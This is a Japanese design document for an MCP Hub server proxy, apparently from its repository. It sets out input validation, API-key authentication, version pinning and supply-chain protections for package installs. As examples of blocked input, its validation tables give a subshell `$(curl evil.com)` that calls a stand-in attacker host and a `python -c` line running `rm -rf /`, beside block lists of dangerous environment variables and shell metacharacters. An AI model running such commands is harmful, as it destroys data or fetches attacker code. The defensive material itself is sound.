# セキュリティモデル

MCP Hub のセキュリティは、**入力バリデーション**、**API 認証**、**バージョンガード** の 3 つのレイヤーで構成されます。

---

## 1. 入力バリデーション

Admin API 経由でのサーバー登録・更新時に、設定値のバリデーションを実施します。
バリデーションは `src/mcp_hub/validators.py` に集約されています。

### 1.1 サーバー名

| ルール | 詳細 |
|---|---|
| 文字種 | `[a-zA-Z0-9_.-]+` のみ許可 |
| 最大長 | 128 文字 |

### 1.2 コマンド (`command`)

コマンド文字列は以下の検証を行います：

| チェック | 禁止/許可 | 例 |
|---|---|---|
| サブシェル実行 | **禁止** | `$(curl evil.com)` |
| シェルメタ文字 | **禁止** | `;`、`&`、`|`、`` ` ``、`<`、`>` |
| 環境変数テンプレート | **許可** | `${VAR}`、`${VAR:-default}` |
| 最大長 | 512 文字 |

**意図：** コマンドインジェクションを防止します。`${VAR}` テンプレートは起動時に環境変数から展開されるため、安全なパラメータ化が可能です。

**安全な例：**
```json
{
  "command": "python",
  "args": ["-m", "mcp_server_fetch"]
}
```

**ブロックされる例：**
```json
{
  "command": "python -c \"import os; os.system('rm -rf /')\""
}
```

### 1.3 URL (`url`)

| チェック | ルール |
|---|---|
| 許可スキーム | `http://`、`https://` のみ |
| ブロックスキーム | `file://`、`gopher://`、`ftp://`、`data:` 等全て禁止 |
| 最大長 | 2048 文字 |

スキームの比較は RFC 3986 に従い大文字小文字を区別しません（`HTTP://`、`Http://` も許可）。

### 1.4 環境変数 (`env`)

| チェック | ルール |
|---|---|
| キー最大長 | 256 文字 |
| 値最大長 | 4096 文字 |
| ブロック対象変数 | `PATH`、`LD_PRELOAD`、`LD_LIBRARY_PATH`、`DYLD_INSERT_LIBRARIES`、`PYTHONPATH`、`PYTHONHOME`、`HOME`、`SHELL`、`MCP_HUB_API_KEY`、`MCP_HUB_DATA_DIR` |

**意図：** 危険な環境変数の上書きを防ぎます。特に `LD_PRELOAD` はプロセスハイジャック、`PATH` は任意コード実行、`MCP_HUB_API_KEY` は認証バイパスにつながる可能性があります。

### 1.5 HTTP ヘッダー (`headers`)

| チェック | ルール |
|---|---|
| 制御文字 | CR、LF、その他 `\x00-\x1f` を**禁止** |
| キー最大長 | 256 文字 |
| 値最大長 | 8192 文字 |

**意図：** HTTP ヘッダーインジェクション（CRLF インジェクション）を防止します。ヘッダーを介したリクエストスマグリングやレスポンス分割攻撃をブロックします。

### 1.6 タグ (`tags`)

| チェック | ルール |
|---|---|
| 型 | 文字列のリストであること |
| 要素最大長 | 64 文字 |

### 1.7 引数 (`args`)

| チェック | ルール |
|---|---|
| 最大要素数 | 50 |
| 各要素最大長 | 1024 文字 |

### 1.8 `command` / `url` 排他ルール

各サーバー設定は `command` と `url` のいずれか一方のみを持つ必要があります。両方の指定、または両方の欠落はバリデーションエラーとなります。これにより接続方式の曖昧さを排除します。

---

## 2. API 認証

### 2.1 認証方式

`MCP_HUB_API_KEY` 環境変数が設定されている場合、Admin REST API への全リクエストに `X-API-Key` ヘッダーが必要になります。

```
X-API-Key: your-configured-api-key
```

認証機構は `src/mcp_hub/auth.py` の `ApiKeyMiddleware`（Starlette `BaseHTTPMiddleware`）で実装されています。

```python
expected = os.environ.get("MCP_HUB_API_KEY", "")
provided = request.headers.get("X-API-Key", "")
if not compare_digest(expected, provided):
    return JSONResponse(status_code=401, ...)
```

- 比較にはタイミング攻撃耐性のある `secrets.compare_digest()` を使用
- 未設定時は全てのリクエストを認証なしで通過

### 2.2 認証対象

| パス | 認証 |
|---|---|
| `/admin/api/health` | **不要**（認証対象外） |
| `/admin/api/*`（上記以外） | **必須**（`MCP_HUB_API_KEY` 設定時） |
| `/mcp` | **認証なし**（MCP エンドポイント） |
| `/admin/` | **認証なし**（Web UI） |

### 2.3 Health エンドポイントの認証除外

`/admin/api/health` は認証を必要としません。これにより：
- ロードバランサーやコンテナオーケストレーター（Docker HEALTHCHECK、Kubernetes readiness probe）が認証なしで死活確認できる
- 監視システムが API キーなしで稼働状態をチェックできる

### 2.4 MCP エンドポイントの認証

MCP エンドポイント（`/mcp`）にはビルトインの認証機構はありません。本番環境ではリバースプロキシ（nginx、Caddy、Traefik 等）を使用して認証・認可を適用してください。

---

## 3. バージョンガード

### 3.1 インストール時のバージョンチェック

`pyproject.toml` で FastMCP のバージョンを `<5.0.0` にピン止めしています：

```toml
dependencies = [
    "fastmcp>=4.0,<5.0",
]
```

### 3.2 起動時の互換性警告

起動時に `fastmcp.__version__` をチェックし、`>=5.0.0` の場合は警告をログに出力します：

```
WARNING: FastMCP 5.x may not be compatible (tested against <5.0.0).
Internal APIs used by MCP-Hub may have changed.
```

これは FastMCP の内部 API（`_mcp_server`、`_lifespan_manager`、`session_manager` 等）がメジャーバージョンで変更される可能性があるためです。

### 3.3 ランタイムバージョンチェック

管理画面の UI 側でも FastMCP バージョンのチェックを行い、互換性のないバージョンが使用されている場合は画面上に警告を表示します。

---

## 4. セキュリティ考慮事項

### 4.1 子サーバーの信頼性

MCP Hub は子サーバーへのプロキシとして機能します。子サーバーが信頼できないコードを実行する場合、そのリスクは MCP Hub を介してクライアントに伝播する可能性があります。子サーバーは信頼できるソースからのみ登録してください。

### 4.2 ネットワークアクセス

- `url` ベースのサーバーは `http://` または `https://` でのみ接続可能
- `command` ベースのサーバーはローカルサブプロセスとして実行
- 両者とも MCP Hub プロセスのネットワーク権限で動作

### 4.3 同時実行制限

`MCP_HUB_MAX_CONCURRENT_CALLS`（デフォルト 50）で同時ツール呼び出し数を制限し、過剰なリソース消費を防止します。

### 4.4 セッション管理

非アクティブなセッションは 5 分ごとにクリーンアップされ、メモリリークを防止します。セッションのタイムアウト機構は現在組み込まれていませんが、FastMCP のセッション管理に委ねられています。

### 4.5 ログ

JSON 形式のログ（`MCP_HUB_LOG=json`）を選択すると、すべてのログエントリが構造化され、SIEM やログ分析システムでの監視が容易になります。

管理 API のツールログ（`GET /admin/api/logs`、Web UI のログタブ）では、API キー・トークン・秘密鍵など機密情報を含む引数・エラーが自動的にマスキング（`***` 置換）されます。ログはメモリ上のリングバッファ（最大 500 件）にのみ保持され、永続化されません。

---

## 5. 供給網保護（モジュール／依存の導入）

依存の取得経路は 2 つあり、それぞれ別の保護を持つ。実装は
`src/mcp_hub/bootstrap.py`（起動時）と `src/mcp_hub/admin_router.py`
（管理 API `/admin/api/tools/install`・`/uninstall`）。

### 5.1 起動時 bootstrap（Node.js / uv / fastembed）

| 保護 | 内容 |
|---|---|
| 取得元の固定 | URL はコード内定数のみ（ユーザー入力なし） |
| https 強制 | `https://` 以外は抽出前に `ValueError` |
| ホスト許可リスト | `bootstrap.py:DOWNLOAD_ALLOWED_HOSTS` = `nodejs.org` / `github.com` / `objects.githubusercontent.com`。リスト外ホストは拒否 |
| SHA256 固定 | `bootstrap.py:PINNED_SHA256` に linux x64 / arm64 の公式ハッシュを保持。不一致なら**展開せず** `ValueError` |
| 未ピン URL の方針 | 既定は警告して続行（`no pinned SHA256 for ...`）。`MCP_HUB_BOOTSTRAP_REQUIRE_HASH=1` で拒否に切替（fail closed） |
| 依存ピン | pip extras は `EXTRAS_PINS` の範囲指定（`MCP_HUB_EXTRAS_PINS` で上書き）。レジストリは `MCP_HUB_PIP_INDEX_URL`（https 以外は既定へフォールバック） |
| 失敗時の挙動 | 検証失敗・インストール失敗でも起動は継続する（Node 依存サーバーのみ影響、埋め込みは BM25 フォールバック）。未検証バイナリは展開しない |
| 監査ログ | `[bootstrap][audit] {"event": "download"|"deps.install", "ok": bool, "url"/"index_url", "sha256"/"error", ...}` |

### 5.2 管理 API からのインストール（pip / uv / uv-tool / npm）

| 保護 | 内容 |
|---|---|
| シェル非経由 | `asyncio.create_subprocess_exec` に固定 argv（`create_subprocess_shell` は使わない）。フラグ注入は先頭 `-` の拒否で防ぐ |
| マネージャー限定 | `manager` は `pip` / `uv` / `uv-tool` / `npm` のみ（400） |
| パッケージ仕様の検証 | 空白・制御文字・シェルメタ文字（`; \| & $ \` \ " '`）・パス区切り・先頭 `.`/`-` を拒否。pip/uv は PEP 508 の範囲指定と URL 仕様（`git+https://`、`https://....whl/.tar.gz`）、npm は `[@scope/]name[@version]` のみ |
| 取得元 | `MCP_HUB_INSTALL_ALLOWED_HOSTS` 設定時は URL 仕様のホストを照合し、不一致は実行前に 400 |
| レジストリ固定 | `MCP_HUB_PIP_INDEX_URL` → `--index-url`、`MCP_HUB_NPM_REGISTRY` → `--registry`。`https://` 以外は警告して無視（既定レジストリ） |
| 依存ピン | `constraints`（例 `mcp<2`）を pip/uv は argv 末尾、uv-tool は `--with` で適用。npm は 400 |
| 自動ピン | `git+` URL を shallow clone して `mcp.server.fastmcp` import を検出した場合のみ `mcp<2` を自動適用（明示 `constraints` があれば上書きしない）。判定不能時は通常インストールへフォールバック |
| 直列化・時間制限 | インストールはプロセス内で同時 1 本（セマフォ）、300 秒でタイムアウト（504） |
| 出力の安全性 | stdout/stderr はマスキング（`mask_text`）後に 8000 文字へ切り詰めて返す |
| 失敗時 | マネージャー未導入は 503、タイムアウトは 504、非ゼロ終了は `{success: false, returncode, stdout, stderr}`（例外にしない）。いずれも監査ログに残る |
| アンインストール | pip/uv は `pip-extras` 配下のディレクトリを PEP 503 正規化 + `realpath` プレフィックス検証で削除（シンボリックリンクは対象外） |
| 監査ログ | `[audit] {"event": "pkg.install"|"pkg.uninstall", "ok": bool, "manager", "returncode", "duration_ms", "error"}` |

### 5.3 保証しないこと（制限）

- 管理 API 経由のインストールは **ハッシュ固定を行わない**（`pip --require-hashes` 相当は未実装）。取得した wheel/sdist の完全性は TLS とレジストリ側の署名に依存する。固定が必要な場合は `constraints` でバージョンを厳密指定するか、イメージビルド時に `pyproject.toml` / `uv.lock` へ組み込むこと。
- **署名検証は行わない**（npm provenance / PyPI 署名 / Sigstore は未対応）。
- npm インストールはパッケージの `postinstall` 等のライフサイクルスクリプトを実行する（`--ignore-scripts` は付けていない）。信頼できないパッケージを入れないこと。
- `MCP_HUB_INSTALL_ALLOWED_HOSTS` は**オプトイン**。未設定時は任意の https ホストからの URL 仕様を許可する（後方互換のため）。公開インスタンスでは設定を推奨。
- `git+` ソースの自動ピン（`mcp<2`）は import 文のヒューリスティックであり、動的 import や間接依存までは検出しない。clone 失敗時はピンなしで続行する。
- インストールされたパッケージは MCP Hub と同じ権限で動作する。導入可否の判断は運用者責任。
